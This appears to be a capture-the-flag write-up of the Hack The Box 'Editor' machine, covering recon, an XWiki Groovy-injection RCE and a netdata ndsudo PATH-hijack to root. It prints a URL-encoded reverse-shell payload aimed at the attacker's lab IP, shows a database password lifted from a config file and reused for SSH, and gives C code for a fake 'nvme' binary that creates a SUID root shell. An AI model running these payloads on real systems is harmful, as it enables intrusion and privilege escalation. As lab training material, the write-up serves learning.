---
{"dg-publish":true,"permalink":"/ct-fs/htb/editor/","dgShowFileTree":true,"dg-note-properties":{}}
---

#linux #xwiki #netdata #ndsudo #PATH #SUID
## Recon

### Nmap:
```zsh
Enter your target IP address or URL here: 10.129.231.23
------------------------------------------------------------
Scanning target 10.129.231.23
Time started: 2026-08-08 03:23:48.361145
------------------------------------------------------------
Port 22 is open
Port 80 is open
Port 8080 is open
Port scan completed in 0:00:47.420956
------------------------------------------------------------
Threader3000 recommends the following Nmap scan:
************************************************************
nmap -p22,80,8080 -sV -sC -T4 -Pn -oA 10.129.231.23 10.129.231.23
************************************************************
Would you like to run Nmap or quit to terminal?
------------------------------------------------------------
1 = Run suggested Nmap scan
2 = Run another Threader3000 scan
3 = Exit to terminal
------------------------------------------------------------
Option Selection: 1
nmap -p22,80,8080 -sV -sC -T4 -Pn -oA 10.129.231.23 10.129.231.23
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-08 03:24 -0400
Nmap scan report for 10.129.231.23
Host is up (0.10s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editor.htb/
8080/tcp open  http    Jetty 10.0.20
|_http-server-header: Jetty(10.0.20)
| http-title: XWiki - Main - Intro
|_Requested resource was http://10.129.231.23:8080/xwiki/bin/view/Main/
|_http-open-proxy: Proxy might be redirecting requests
| http-webdav-scan: 
|   WebDAV type: Unknown
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK
|_  Server Type: Jetty(10.0.20)
| http-cookie-flags: 
|   /: 
|     JSESSIONID: 
|_      httponly flag not set
| http-robots.txt: 50 disallowed entries (15 shown)
| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/ 
| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/ 
| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/ 
| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/ 
| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/ 
|_/xwiki/bin/undelete/
| http-methods: 
|_  Potentially risky methods: PROPFIND LOCK UNLOCK
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.78 seconds
------------------------------------------------------------

```
Portscanning shows ports 22 (ssh), 80 and 8080 (webservers). adding `editor.htb` to `/etc/hosts`

### Port 8080
#### Web/Github research
Found `xwiki` running on the sever. internet reveals unathed RCE vuln in the `SolrSearchMacros` endpoint under `http://editor.htb:8080/xwikin/bin/view/Main/SolrSearchMacros?search=VULNERABLE TO GROOVY INJECTION`. Found [POC](https://github.com/investigato/cve-2025-24893-poc/releases/tag/v0.1.0). 

>[!note]
>You must install Rust on kali if you want to build this specific POC correctly. Find instructions for that [here](https://rust-lang.org/tools/install/)

## Initial Access
### CVE-2025-24893 RCE
```zsh
┌──(kali㉿kali)-[~/…/HTB/editor/exploit/cve-2025-24893-poc]
└─$ ./target/release/cve-2025-24893-gato --url http://editor.htb:8080 --ip 10.10.14.192

     ___
 _.-|   |          |\__/,|   (`\
{   |   |          |o o  |__ _) )
 "-.|___|        _.( T   )  `  /
  .--'-`-.     _((_ `^--' /_<  \
.+|______|__.-||__)`-'(((/  (((/
CVE-2025-24893 PoC by Investigato
Xwiki Remote Code Execution    

[*] Sending exploit to: http://editor.htb:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7D%22bash%20-c%20%7Becho%2CYmFzaCAtYyAnc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTkyLzQ0NDQgMD4mMSc%3D%7D%7C%7Bbase64%2C-d%7D%7C%7Bbash%2C-i%7D%22.execute%28%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D
[*] Check your listener

┌──(kali㉿kali)-[~/…/HTB/editor/exploit/cve-2025-24893-poc]
└─$ nc -lnvp 4444                                             
listening on [any] 4444 ...
connect to [10.10.14.192] from (UNKNOWN) [10.129.231.23] 34370
sh: 0: can't access tty; job control turned off
$ id
uid=997(xwiki) gid=997(xwiki) groups=997(xwiki)
$ 
```
As you can see, we successfully get a reverse shell on the system as user `xwiki`.

```zsh
xwiki@editor:~$ ls /home
total 12K
4.0K drwxr-xr-x  3 root   root   4.0K Jul  8  2025 .
4.0K drwxr-xr-x 18 root   root   4.0K Jul 29  2025 ..
4.0K drwxr-x---  3 oliver oliver 4.0K Jul  8  2025 oliver
```
Enumerating `/home` we see user `oliver` on the server.

```zsh
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
mysql:x:115:121:MySQL Server,,,:/nonexistent:/bin/false
tomcat:x:998:998:Apache Tomcat:/var/lib/tomcat:/usr/sbin/nologin
xwiki:x:997:997:XWiki:/var/lib/xwiki:/usr/sbin/nologin
netdata:x:996:999:netdata:/opt/netdata:/usr/sbin/nologin
oliver:x:1000:1000:,,,:/home/oliver:/bin/bash
_laurel:x:995:995::/var/log/laurel:/bin/false
```
we confirm user `oliver` is the only user besides `root` that doesn't have a login shell.

```zsh
sudo: The "no new privileges" flag is set, which prevents sudo from running as root.
sudo: If sudo is running in a container, you may need to adjust the container configuration to disable the flag.
```
Initial enumeration of our sudo privs shows that we have the `no new privilege` flag set which is common in containerized envs. 

```zsh
xwiki@editor:~$ ls /opt
total 16K
4.0K drwxr-xr-x  4 root root 4.0K Jul  8  2025 .
4.0K drwxr-xr-x 18 root root 4.0K Jul 29  2025 ..
4.0K drwx--x--x  4 root root 4.0K Jul  8  2025 containerd
4.0K drwxr-xr-x  8 root root 4.0K Jul  8  2025 netdata
```
Confirmed `containderd` in use on our system.

```zsh
xwiki@editor:~$ find / -perm -04000 2>/dev/null
/opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network
/opt/netdata/usr/libexec/netdata/plugins.d/network-viewer.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/local-listeners
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
/opt/netdata/usr/libexec/netdata/plugins.d/ioping
/opt/netdata/usr/libexec/netdata/plugins.d/nfacct.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.plugin
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/umount
/usr/bin/chsh
/usr/bin/fusermount3
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/mount
/usr/bin/chfn
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-****
```
Further SUID enumeration shows that netdata has the default intstallation including `ndsudo`. [Advisory](https://github.com/netdata/netdata/security/advisories/GHSA-pmhq-4cxq-wj93) shows this can be abused on affected versions to execute arbitrary system commands due to an unquoted path vulnerability. This may come in handy if we can use `sudo` as `oliver` or if we somehow manage to laterally move to the `netdata` user.

```zsh
hibernate.cfg.xml:    <property name="hibernate.connection.password">theEd1t0rTeam99</property>
hibernate.cfg.xml:    <property name="hibernate.connection.password">xwiki</property>
hibernate.cfg.xml:    <property name="hibernate.connection.password">xwiki</property>
hibernate.cfg.xml:    <property name="hibernate.connection.password"></property>
hibernate.cfg.xml:    <property name="hibernate.connection.password">xwiki</property>
hibernate.cfg.xml:    <property name="hibernate.connection.password">xwiki</property>
hibernate.cfg.xml:    <property name="hibernate.connection.password"></property>
xwiki.properties:#-# * password: the password to use to authenticate to the repository
xwiki.properties:# extension.repositories.privatemavenid.auth.password = thepassword
xwiki.properties:#-# Define the lifetime of the token used for resetting passwords in minutes. Note that this value is only used after
xwiki.properties:#-# Use a different value if the reset password email link might be accessed several times (e.g. in case of using an
xwiki.properties:# security.authentication.resetPasswordTokenLifetime = 0
xwiki.properties:#-# This parameter defines if as part of the migration R140600000XWIKI19869 the passwords of impacted user should be
xwiki.properties:#-# their users to keep their passwords nevertheless, then enable the configuration and set it to false before the
xwiki.properties:# security.migration.R140600000XWIKI19869.resetPassword = true
xwiki.properties:#-# This parameter defines if reset password emails should be sent as part of the migration R140600000XWIKI19869.
xwiki.properties:#-# this option to false: note that in such case a file containing the list of users for whom a reset password email
xwiki.properties:# security.migration.R140600000XWIKI19869.sendResetPasswordEmail = true
xwiki.properties:#-# this option to false: note that in such case a file containing the list of users for whom a reset password email
xwiki.properties:#-# Password to authenticate on the SMTP server, if needed. By default no authentication is performed.
xwiki.properties:#-# This configuration property can be overridden in XWikiPreferences objects, by using the "smtp_server_password"
xwiki.properties:# mail.sender.password = somepassword
hibernate.cfg.xml.ucf-dist:    <property name="hibernate.connection.password">xwikipassword2025</property>
hibernate.cfg.xml.ucf-dist:    <property name="hibernate.connection.password">xwiki</property>
hibernate.cfg.xml.ucf-dist:    <property name="hibernate.connection.password">xwiki</property>
hibernate.cfg.xml.ucf-dist:    <property name="hibernate.connection.password"></property>
hibernate.cfg.xml.ucf-dist:    <property name="hibernate.connection.password">xwiki</property>
hibernate.cfg.xml.ucf-dist:    <property name="hibernate.connection.password">xwiki</property>
hibernate.cfg.xml.ucf-dist:    <property name="hibernate.connection.password"></property>
fonts/LICENSE-freefont:source code form), and must require no special password or key for
xwiki.cfg:# xwiki.superadminpassword=syste
```
After several hours of manually enumerating the filesystem, using a hint that also said use the filesystem for `xwiki`, passing all of the xwiki files through `trufflehog` and `DumpsterDiver` and finding nothing I finally referenced a walk through that said a password was in `hibernate.cfg.xml` which lo and behold we find one `theEd1t0rTeam99`. Not sure how `trufflehog` and `DumpsterDiver` missed it but whatever.

```zsh
┌──(kali㉿kali)-[~/…/files/xwiki_files/etc_xwiki/xwiki]
└─$ ssh oliver@editor.htb                            
The authenticity of host 'editor.htb (10.129.231.23)' can't be established.
ED25519 key fingerprint is: SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'editor.htb' (ED25519) to the list of known hosts.
oliver@editor.htb's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-151-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon Aug 10 09:45:52 PM UTC 2026

  System load:  0.04              Processes:             238
  Usage of /:   65.1% of 7.28GB   Users logged in:       0
  Memory usage: 59%               IPv4 address for eth0: 10.129.231.23
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

4 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

4 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Aug 10 21:45:53 2026 from 10.10.14.192
oliver@editor:~$ 
```
Successfully ssh as `oliver` to the system.


## Privilege Escalation
### Group Abuse (netdata)
```zsh
oliver@editor:~$ id
uid=1000(oliver) gid=1000(oliver) groups=1000(oliver),999(netdata)
```
evaluating our user's group membership we see that they are apart of the `netdata` group. We may be able to abuse the `ndsudo` unquoted path vuln to escalate our privileges.

```zsh
oliver@editor:~$ /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
at least 2 parameters are needed, but 1 were given.
```
Calling the full path to `ndsudo` with no arguments we see we do have permission to run it on this machine.

```zsh
oliver@editor:~$ /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo -h

ndsudo

(C) Netdata Inc.

A helper to allow Netdata run privileged commands.

  --test
    print the generated command that will be run, without running it.

  --help
    print this message.

The following commands are supported:

- Command    : nvme-list
  Executables: nvme 
  Parameters : list --output-format=json

- Command    : nvme-smart-log
  Executables: nvme 
  Parameters : smart-log {{device}} --output-format=json

- Command    : megacli-disk-info
  Executables: megacli MegaCli 
  Parameters : -LDPDInfo -aAll -NoLog

- Command    : megacli-battery-info
  Executables: megacli MegaCli 
  Parameters : -AdpBbuCmd -aAll -NoLog

- Command    : arcconf-ld-info
  Executables: arcconf 
  Parameters : GETCONFIG 1 LD

- Command    : arcconf-pd-info
  Executables: arcconf 
  Parameters : GETCONFIG 1 PD

The program searches for executables in the system path.

Variables given as {{variable}} are expected on the command line as:
  --variable VALUE

VALUE can include space, A-Z, a-z, 0-9, _, -, /, and .
```
Reading the helper text for `ndsudo` we can see that we have the ability to run a few executables. However, those executables are not fully quoted paths and therefore rely on the user's `$PATH` variable to find the binaries being called. Since this exists coupled with it's SUID nature it retains `root` privileges as it's executed. If we can create a binary with a similar name to one of the ones in the script, we can get a shell as `root`

```zsh
oliver@editor:~$ cat nvme
#!/bin/bash
cp /bin/bash /tmp/bash && chmod +s /tmp/bash
oliver@editor:~$ export PATH:/home/oliver:$PATH
-bash: export: `PATH:/home/oliver:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin': not a valid identifier
oliver@editor:~$ 
```
What we've done is created a script called `nvme` as it is one of the named executables in `ndsudo`. We then updated our `$PATH` variable to begin with our user's home folder where our malicious `nvme` script resides. Now when we call `ndsudo nvme-list` it should copy `/bin/bash` to `/tmp/bash` and make it an SUID binary allowing us to call a shell as `root`. 

However no dice.

```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/types.h>

int main() {
    setuid(0);
    seteuid(0);
    setgid(0);
    setegid(0);
    system("cp /bin/bash /tmp/0xdf; chown root:root /tmp/0xdf; chmod 6777 /tmp/0xdf");
}
```
The reason our original exploit isn't working is because the binary for `ndsudo` drops our SUID context when running so we need to reset it with a custom c script instead of just a bash script on our own machine, compile it with `gcc nvme.c -o nvme` and upload it to our target machine with a python http server and `wget`. From there we make it executable and do the same `$PATH` tricks as before.

```zsh
oliver@editor:/tmp$ /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
oliver@editor:/tmp$ ls
total 1.4M
4.0K drwxrwxrwt 10 root    root    4.0K Aug 10 22:46 .
4.0K drwxr-xr-x 18 root    root    4.0K Jul 29  2025 ..
1.4M -rwsrwsrwx  1 root    root    1.4M Aug 10 22:46 0xdf
   0 srwxrwx---  1 netdata netdata    0 Aug 10 18:13 netdata-ipc
 16K -rwxrwxr-x  1 oliver  oliver   16K Aug 10 22:45 nvme
4.0K drwx------  3 root    root    4.0K Aug 10 22:23 systemd-private-4d5a2305bbd94ae8b16bc382f6dfc210-fwupd.service-IxBfbC
4.0K drwx------  3 root    root    4.0K Aug 10 18:12 systemd-private-4d5a2305bbd94ae8b16bc382f6dfc210-ModemManager.service-EGcjct
4.0K drwx------  3 root    root    4.0K Aug 10 18:12 systemd-private-4d5a2305bbd94ae8b16bc382f6dfc210-systemd-logind.service-QyoQld
4.0K drwx------  3 root    root    4.0K Aug 10 18:12 systemd-private-4d5a2305bbd94ae8b16bc382f6dfc210-systemd-resolved.service-5qZyTE
4.0K drwx------  3 root    root    4.0K Aug 10 18:12 systemd-private-4d5a2305bbd94ae8b16bc382f6dfc210-systemd-timesyncd.service-IoVBvs
4.0K drwx------  3 root    root    4.0K Aug 10 22:23 systemd-private-4d5a2305bbd94ae8b16bc382f6dfc210-upower.service-35wPvp
4.0K drwx------  3 root    root    4.0K Aug 10 18:12 systemd-private-4d5a2305bbd94ae8b16bc382f6dfc210-xwiki.service-0oXcZr
4.0K drwx------  2 root    root    4.0K Aug 10 18:13 vmware-root_611-3980232955


oliver@editor:/tmp$ ./0xdf -p
0xdf-5.1# id
uid=1000(oliver) gid=1000(oliver) euid=0(root) egid=0(root) groups=0(root),999(netdata),1000(oliver)

```
Once we made that change we successfully got our copied `/bin/bash` SUID root-owned binary in `/tmp/0xdf` and successfully get a session as `root` (contextually). pwned.

## Final Thoughts
>[!Takeaways]
>- be sure to install all dependencies for a tool you need if it uses an non-default language (i.e. Rust, Go, etc.)
>- read all config files carefully. sometimes even sniffers will miss obvious secrets. check symlink destinations too (i.e. /etc/[binary])
>- if your PATH abuse vuln is dropping SUID context try writing a C script wrapper to persist it.




